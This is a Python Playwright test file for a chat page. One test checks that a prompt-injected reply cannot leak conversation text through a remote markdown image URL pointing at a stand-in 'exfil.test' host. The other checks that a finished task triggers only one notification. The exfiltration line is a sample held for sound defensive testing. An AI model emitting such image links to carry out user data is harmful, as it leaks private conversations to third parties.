"""The chat page must not leak conversation data through images or double-notify a finished task."""
from playwright.sync_api import sync_playwright

from test_motion_navigation_ui import open_page

PIXEL = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'


def test_remote_images_in_a_reply_are_not_fetched():
    """A prompt-injected reply could carry chat text in an image URL; the page must not request it."""
    with sync_playwright() as engine:
        browser, page, errors = open_page(engine)
        hits = []
        page.route('https://exfil.test/**', lambda route: (hits.append(route.request.url), route.abort()))
        page.evaluate('''px=>{const d=document.createElement('div');d.id='probe';
          d.innerHTML=md('![a](https://exfil.test/p.png?d=secret) ![b]('+px+')');document.body.appendChild(d)}''', PIXEL)
        page.wait_for_timeout(500)
        assert hits == []
        assert page.evaluate("[...document.querySelectorAll('#probe img')].map(i=>i.complete&&i.naturalWidth)") == [0, 1]
        assert not errors
        browser.close()


def test_finished_task_is_notified_once_when_the_capsule_service_runs():
    """FloatService already posts the per-conversation notification; the page must not add a second one."""
    with sync_playwright() as engine:
        browser, page, errors = open_page(engine)
        sent = page.evaluate('''()=>{Object.defineProperty(document,'hidden',{configurable:true,get:()=>true});
          const out=[];window.GA.notify=(...a)=>{out.push(a[1])};
          for(const running of [true,false]){window.GA.floatState=()=>JSON.stringify({perm:true,always:true,running,err:''});
            notifyAway('done')}
          return out.length}''')
        assert sent == 1   # only the run without the native service notifies
        assert not errors
        browser.close()
